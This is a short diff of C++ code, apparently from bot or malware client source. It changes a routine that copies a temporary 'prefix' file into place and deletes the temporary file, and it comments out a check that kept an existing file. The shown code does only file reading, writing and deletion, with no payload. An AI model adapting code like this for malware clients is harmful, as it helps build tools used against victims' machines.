@@ -1196,13 +1196,16 @@ void BOT::SavePrefixFromTemporaryFile(bool IgnoreIfExists)
 	string TempName   = Bot->MakeFileName(NULL, GetStr(EStrTemporaryPrefixFileName).t_str());
 	if (File::IsExists(TempName.t_str()))
 	{
-		string PrefixFile = Bot->PrefixFileName();
-		if (!IgnoreIfExists || !File::IsExists(PrefixFile.t_str()))
+		
+		//if (!IgnoreIfExists || !File::IsExists(PrefixFile.t_str()))
 		{
 			DWORD Size = 0;
 			LPBYTE Prefix = File::ReadToBufferA(TempName.t_str(), Size);
 			if (Prefix && Size)
+			{
+				string PrefixFile = Bot->PrefixFileName();
 				File::WriteBufferA(PrefixFile.t_str(), Prefix, Size);
+			}
 			MemFree(Prefix);
         }
 		pDeleteFileA(TempName.t_str());
